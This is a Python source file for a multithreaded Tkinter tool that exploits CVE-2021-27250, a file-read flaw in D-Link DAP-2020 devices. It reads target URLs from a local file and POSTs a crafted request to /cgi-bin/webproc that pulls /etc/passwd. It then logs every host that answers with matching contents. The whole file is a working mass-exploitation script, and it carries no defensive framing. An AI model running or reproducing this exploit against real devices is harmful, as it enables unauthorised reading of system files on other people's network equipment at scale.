import requests
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def Dap_2020_anyfile_read_cve_2021_27250_exp(url):
    poc = r"""/cgi-bin/webproc"""
    url = url + poc
    data = r"""getpage=html%2Findex.html&errorpage=/etc/passwd&var%3Amenu=setup&var%3Apage=wizard&var%3Alogin=true&obj-action=auth&%3Ausername=admin&%3Apassword=123&%3Aaction=login&%3Asessionid=3c1f7123"""
    try:
        res = requests.post(url, verify=False,data=data,timeout=3)
        if "root" in res.text:
            Dap_2020_anyfile_read_cve_2021_27250_text.insert(END,"【！！！！！！】存在漏洞的url：" + url + "\n")
            Dap_2020_anyfile_read_cve_2021_27250_text.see(END)
            with open ("存在D-LINK DAP-2020 webproc 任意文件读取漏洞(CVE-2021-27250)的url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            Dap_2020_anyfile_read_cve_2021_27250_text.insert(END,"【×】不存在漏洞的url：" + url + "\n")
            Dap_2020_anyfile_read_cve_2021_27250_text.see(END)
    except Exception as err:
        Dap_2020_anyfile_read_cve_2021_27250_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
        Dap_2020_anyfile_read_cve_2021_27250_text.see(END)
def get_Dap_2020_anyfile_read_cve_2021_27250_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def Dap_2020_anyfile_read_cve_2021_27250_gui():
    Dap_2020_anyfile_read_cve_2021_27250 = tk.Tk()
    Dap_2020_anyfile_read_cve_2021_27250.geometry("910x450")
    Dap_2020_anyfile_read_cve_2021_27250.title("D-LINK DAP-2020 webproc 任意文件读取漏洞(CVE-2021-27250)一把梭")
    Dap_2020_anyfile_read_cve_2021_27250.resizable(0, 0)
    Dap_2020_anyfile_read_cve_2021_27250.iconbitmap('logo.ico')
    global Dap_2020_anyfile_read_cve_2021_27250_text
    Dap_2020_anyfile_read_cve_2021_27250_text = scrolledtext.ScrolledText(Dap_2020_anyfile_read_cve_2021_27250,width=123, height=25)
    Dap_2020_anyfile_read_cve_2021_27250_text.grid(row=0, column=0, padx=10, pady=10)
    Dap_2020_anyfile_read_cve_2021_27250_text.see(END)
    addrs = get_Dap_2020_anyfile_read_cve_2021_27250_addr()
    max_thread_num = 20
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(Dap_2020_anyfile_read_cve_2021_27250_exp, addr)
    Dap_2020_anyfile_read_cve_2021_27250.mainloop()